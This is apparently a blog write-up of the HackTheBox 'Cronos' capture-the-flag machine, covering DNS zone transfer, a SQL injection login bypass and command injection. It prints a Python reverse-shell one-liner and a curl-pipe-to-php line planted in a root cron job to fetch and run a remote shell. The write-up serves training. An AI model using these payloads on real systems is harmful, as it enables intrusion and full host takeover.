---
layout: post
title:	"Cronos Writeup"
date:	2018-09-20 03:00:00
categories:
    - writeups
tags:
    - ctf
    - boot2root
    - hackthebox
---
<head>
	<title> Cronos Writeup | HackTheBox </title>
</head>

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/logo.png)

## i. Port Scan

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/ports.png)

## ii. Enumeration

Navigating to the host in the browser:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser.png)

Default Apache page...

Running a gobuster:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/gobuster.png)

`No results...`

In the port scan, we saw DNS open. Let's see if we can find any information:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/nslookup.png)

We got a domain, `cronos.htb`

Let's add `cronos.htb` to our hosts file and attempt to browse to it:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser2.png)

Running a gobuster scan:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/gobuster2.png)

Viewing robots.txt:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/robots.png)

Once again, another dead end...

Let's attempt a zone transfer, and see what kind of information we get:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/zonetransfer.png)

`admin.cronos.htb` looks very promising...

After adding `admin.cronos.htb` to `/etc/hosts`, let's navigate to it:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser3.png)

A login page, lets attempt to bypass using SQLi...

`admin' or '1'='1`

~~~
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
~~~

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/bypass.png)

Access granted.

Looks like we can run traceroute and see the output in the browser.

Let's see if it's vulnerable to command injection:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/commandinjection.png)

We have command injection!

To get a shell, I'm going to use a reverse shell python one-liner:

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~

Looking at our listener:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/revshell.png)

## iii. Privilege Escalation

Based off the name of the machine, and after not having much luck enumerating, let's focus on cron.

Viewing `/etc/crontab`:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/crontab1.png)

The last line seems interesting... seems like artisan is being executed by root.

Let's look at the permissions of `/var/www/laravel/artisan`:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/artisan.png)

We own the file, and are able to write to it.

Editing artisan:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/cron.png)

~~~
<?php
system('curl http://10.10.10.14/rev.php | php')
?>

This will download the php reverse shell from my host, and pipe it into php to execute.

php reverse shell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
~~~

Waiting a couple of seconds, and looking at our listener:

![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/root.png)

## iv. Conclusion

This box was a great refresher/practice for DNS.

Thanks for reading.

~~~
Sources / Links:
[0]: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
[1]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~


